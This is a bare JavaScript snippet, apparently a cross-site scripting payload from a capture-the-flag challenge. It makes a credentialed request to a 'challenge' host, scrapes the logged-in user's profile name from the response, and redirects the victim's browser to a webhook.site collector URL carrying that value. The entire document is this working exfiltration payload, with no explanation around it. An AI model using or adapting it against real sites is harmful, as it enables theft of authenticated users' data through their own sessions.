var r = new XMLHttpRequest();
r.open("GET", "http://challenge:8080/", true); 
r.onreadystatechange = function() { 
    if (r.readyState == 4){
        var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
        window.location = 'https://webhook.site/a3adedf1-127c-4055-a555-070ae3808481/q=' + res;
    }
};
r.withCredentials = true;
r.send();
